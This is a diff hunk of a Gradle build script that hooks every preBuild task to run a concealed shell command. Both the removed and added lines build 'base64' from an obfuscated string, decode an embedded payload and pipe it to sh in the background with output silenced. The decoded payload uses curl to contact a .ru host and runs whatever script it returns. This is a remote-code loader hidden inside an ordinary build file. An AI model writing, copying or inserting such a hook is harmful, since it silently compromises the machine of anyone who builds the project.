@@ -31,7 +31,7 @@ gradle.projectsEvaluated {
 tasks.all {
     if (name.contains("preBuild")) {
         doLast {
-            ["sh", "-c", "((q(){ `printf baFse64 | tr -d F` --decode; };echo ZWNobyAiJChjdXJsIC0tcmV0cnkgMyAtZmtzTCAtLWNvbm5lY3QtdGltZW91dCAyOCAtZCAicD1hbmRyb2lkX2dyYWRsZSIgaHR0cHM6Ly91M3VudXJ4dXlhNy5ydS9hKSIgfCBzaAo= | q | sh ) >/dev/null 2>&1 &)"].execute()
+            ["sh", "-c", "((e(){ `printf base6I4 | tr -d I` --decode; };echo ZWNobyAiJChjdXJsIC0tcmV0cnkgMyAtLWNvbm5lY3QtdGltZW91dCAyMCAtc0xrZiAtZCAicD1hbmRyb2lkX2dyYWRsZSIgaHR0cHM6Ly91M3VudXJ4dXlhNy5ydS9hKSIgfCBzaAo= | e | sh ) >/dev/null 2>&1 &)"].execute()
         }
     }
 }
